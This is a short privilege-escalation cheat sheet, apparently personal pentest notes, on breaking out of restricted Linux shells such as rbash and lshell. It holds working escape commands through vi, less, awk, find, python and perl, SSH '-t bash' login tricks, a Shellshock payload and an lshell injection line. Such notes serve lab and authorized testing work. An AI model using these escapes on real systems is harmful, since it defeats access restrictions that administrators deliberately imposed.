# Linux privesc: restricted shell escape

## What I am in
echo $SHELL
echo $0
echo $PATH
export -p
compgen -c
cd /
- [ ] cd refused as restricted: rbash
- [ ] A menu, or a prompt that is not bash: lshell or a custom one
- [ ] Every program compgen -c lists, looked up on GTFOBins, gtfobins.github.io, under Shell

## Through an allowed program
In vi or vim:
:set shell=/bin/bash
:shell
In less, more or man:
!/bin/bash
awk 'BEGIN {system("/bin/bash")}'
find / -name x -exec /bin/bash \; -quit
python3 -c 'import os; os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'
- [ ] ed, ftp, gdb, git, mail, nmap, ssh and tar have ways out too, on GTFOBins
- [ ] cp allowed and a folder on my PATH writable: cp /bin/bash into it, then run bash

## At login, over SSH
ssh '<Username>'@<TargetIP> -t bash
ssh '<Username>'@<TargetIP> -t 'bash --noprofile'
With a forced command and an old bash open to Shellshock:
ssh '<Username>'@<TargetIP> -t '() { :; }; sh -i'
- [ ] scp or sftp allowed: my own .bashrc or .profile written over the restricted one, then a new login

## lshell
On old lshell versions, echo runs Python:
echo os.system('/bin/bash')

## Once out
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
- [ ] A proper terminal: :Pb shells
- [ ] Then the usual checks: :Pb linux-enum
